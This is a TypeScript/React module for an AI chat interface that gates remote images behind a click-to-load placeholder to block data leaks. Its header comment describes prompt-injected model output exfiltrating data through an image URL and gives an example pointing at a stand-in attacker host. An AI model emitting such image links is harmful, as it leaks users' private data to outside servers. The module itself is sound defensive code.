/**
 * Remote image gate (privacy).
 *
 * Model output (Markdown and UI blocks) can point images at any server, and an
 * automatic load is a request the user never agreed to: a prompt-injected
 * `https://attacker.example/pixel.png?memory=…` would leak data even when web
 * tools are denied. So remote images render as a click-to-load placeholder
 * that names the host, unless:
 * - the URL is an inline `data:image/*` URL,
 * - it is same-origin (or an origin the app trusts, such as its own server),
 * - the user already allowed that host this session, or
 * - the app turned on "load remote images automatically".
 *
 * Per-host choices last for the browser session (sessionStorage).
 */
import { createContext, useContext, useMemo, useSyncExternalStore, type CSSProperties, type KeyboardEvent, type MouseEvent, type ReactElement, type ReactNode } from 'react';
import { Icon } from './icons.js';
import { useT } from './i18n.js';

export interface RemoteImagePolicy {
  /** Load remote http(s) images without asking. Default false. */
  autoLoad: boolean;
  /** Origins treated like the app's own (e.g. the NEO server the app talks to). */
  trustedOrigins: string[];
}

const DEFAULT_POLICY: RemoteImagePolicy = { autoLoad: false, trustedOrigins: [] };
const RemoteImageContext = createContext<RemoteImagePolicy>(DEFAULT_POLICY);

export function RemoteImageProvider({ autoLoad = false, trustedOrigins, children }: { autoLoad?: boolean; trustedOrigins?: string[]; children: ReactNode }): ReactElement {
  const key = (trustedOrigins ?? []).join('\n');
  const value = useMemo<RemoteImagePolicy>(() => ({ autoLoad, trustedOrigins: key ? key.split('\n') : [] }), [autoLoad, key]);
  return <RemoteImageContext.Provider value={value}>{children}</RemoteImageContext.Provider>;
}

export function useRemoteImagePolicy(): RemoteImagePolicy {
  return useContext(RemoteImageContext);
}

// ── session-scoped host allow list ─────────────────────────────────────────

const SESSION_KEY = 'neo.remote-image-hosts';
let allowedHosts: Set<string> | null = null;
const listeners = new Set<() => void>();
let version = 0;

function hosts(): Set<string> {
  if (allowedHosts) return allowedHosts;
  allowedHosts = new Set();
  try {
    const raw = globalThis.sessionStorage?.getItem(SESSION_KEY);
    const list: unknown = raw ? JSON.parse(raw) : [];
    if (Array.isArray(list)) for (const h of list) if (typeof h === 'string') allowedHosts.add(h);
  } catch {
    // Storage blocked: the choice lasts until reload.
  }
  return allowedHosts;
}

function emit(): void {
  version++;
  for (const fn of listeners) fn();
}

/** Allow images from these hosts for the rest of the session. */
export function allowRemoteImageHosts(list: string[]): void {
  const set = hosts();
  let changed = false;
  for (const h of list) {
    const host = h.toLowerCase();
    if (host && !set.has(host)) {
      set.add(host);
      changed = true;
    }
  }
  if (!changed) return;
  try {
    globalThis.sessionStorage?.setItem(SESSION_KEY, JSON.stringify([...set]));
  } catch {
    // ignore
  }
  emit();
}

export function isRemoteImageHostAllowed(host: string): boolean {
  return hosts().has(host.toLowerCase());
}

/** Forget every per-host choice (tests, "reset privacy choices"). */
export function resetRemoteImageHosts(): void {
  allowedHosts = new Set();
  try {
    globalThis.sessionStorage?.removeItem(SESSION_KEY);
  } catch {
    // ignore
  }
  emit();
}

function subscribe(fn: () => void): () => void {
  listeners.add(fn);
  return () => listeners.delete(fn);
}

// ── classification ─────────────────────────────────────────────────────────

const DATA_IMAGE = /^data:image\/[a-z0-9.+-]+[;,]/i;

export type ImageSource =
  | { kind: 'inline' }
  | { kind: 'local' }
  | { kind: 'remote'; host: string; origin: string }
  | { kind: 'blocked' };

function appOrigin(): string | null {
  try {
    const origin = globalThis.location?.origin;
    return origin && origin !== 'null' ? origin : null;
  } catch {
    return null;
  }
}

/** What kind of image URL this is. Anything but data:image/* and http(s) is blocked. */
export function classifyImageUrl(url: string, trustedOrigins: string[] = []): ImageSource {
  const value = url.trim();
  if (DATA_IMAGE.test(value)) return { kind: 'inline' };
  if (!/^https?:\/\//i.test(value)) return { kind: 'blocked' };
  let parsed: URL;
  try {
    parsed = new URL(value);
  } catch {
    return { kind: 'blocked' };
  }
  const own = appOrigin();
  if ((own && parsed.origin === own) || trustedOrigins.some((o) => o === parsed.origin)) return { kind: 'local' };
  return { kind: 'remote', host: parsed.hostname.toLowerCase(), origin: parsed.origin };
}

export interface RemoteImageState {
  /** 'show' = render the <img>; 'ask' = render a placeholder; 'blocked' = render nothing. */
  status: 'show' | 'ask' | 'blocked';
  /** Remote hosts that still need the user's OK (empty unless status is 'ask'). */
  hosts: string[];
  allow: () => void;
}

/** Decide for one or more image URLs together (a gallery asks once). */
export function useRemoteImages(urls: string[]): RemoteImageState {
  const policy = useRemoteImagePolicy();
  useSyncExternalStore(subscribe, () => version, () => version);
  const sources = urls.map((u) => classifyImageUrl(u, policy.trustedOrigins));
  if (sources.length === 0 || sources.every((s) => s.kind === 'blocked')) return { status: 'blocked', hosts: [], allow: () => undefined };
  const pending = policy.autoLoad
    ? []
    : [...new Set(sources.flatMap((s) => (s.kind === 'remote' && !isRemoteImageHostAllowed(s.host) ? [s.host] : [])))];
  return { status: pending.length ? 'ask' : 'show', hosts: pending, allow: () => allowRemoteImageHosts(pending) };
}

// ── placeholder + image ────────────────────────────────────────────────────

export interface RemoteImagePlaceholderProps {
  hosts: string[];
  onLoad: () => void;
  /** How many images the placeholder stands for (galleries). */
  count?: number;
  /** Small square (thumbnails) instead of a full-width box. */
  compact?: boolean;
  /** Render a span[role=button] so it can live inside a link or button. */
  nested?: boolean;
  className?: string;
  style?: CSSProperties;
}

export function RemoteImagePlaceholder({ hosts: list, onLoad, count = 1, compact, nested, className, style }: RemoteImagePlaceholderProps): ReactElement {
  const t = useT();
  const host = list.join(', ');
  const label = count > 1 ? t('image.load_many', { count, host }) : t('image.load_from', { host });
  const activate = (e: MouseEvent | KeyboardEvent) => {
    e.preventDefault();
    e.stopPropagation();
    onLoad();
  };
  const cls = ['neo-remote-image', compact ? 'neo-remote-image--compact' : '', className ?? ''].filter(Boolean).join(' ');
  const content = compact ? (
    <Icon name="image" size={16} />
  ) : (
    <>
      <span className="neo-remote-image__icon">
        <Icon name="image" size={18} />
      </span>
      <span className="neo-remote-image__text">
        <span className="neo-remote-image__label">{label}</span>
        <span className="neo-remote-image__hint">{t('image.remote_hint')}</span>
      </span>
    </>
  );
  if (nested) {
    return (
      <span
        role="button"
        tabIndex={0}
        className={cls}
        style={style}
        title={label}
        aria-label={label}
        data-remote-image=""
        onClick={activate}
        onKeyDown={(e) => {
          if (e.key === 'Enter' || e.key === ' ') activate(e);
        }}
      >
        {content}
      </span>
    );
  }
  return (
    <button type="button" className={cls} style={style} title={label} aria-label={label} data-remote-image="" onClick={activate}>
      {content}
    </button>
  );
}

export interface SafeImageProps {
  src: string;
  alt?: string;
  className?: string;
  style?: CSSProperties;
  /** Placeholder style when the image needs a click. */
  compact?: boolean;
  nested?: boolean;
  placeholderClassName?: string;
  onClick?: (e: MouseEvent<HTMLImageElement>) => void;
}

/** An <img> that respects the remote image policy. */
export function SafeImage({ src, alt = '', className, style, compact, nested, placeholderClassName, onClick }: SafeImageProps): ReactElement | null {
  const state = useRemoteImages([src]);
  if (state.status === 'blocked') return null;
  if (state.status === 'ask') return <RemoteImagePlaceholder hosts={state.hosts} onLoad={state.allow} compact={compact} nested={nested} className={placeholderClassName ?? (compact ? className : undefined)} />;
  return <img src={src} alt={alt} className={className} style={style} loading="lazy" referrerPolicy="no-referrer" onClick={onClick} />;
}
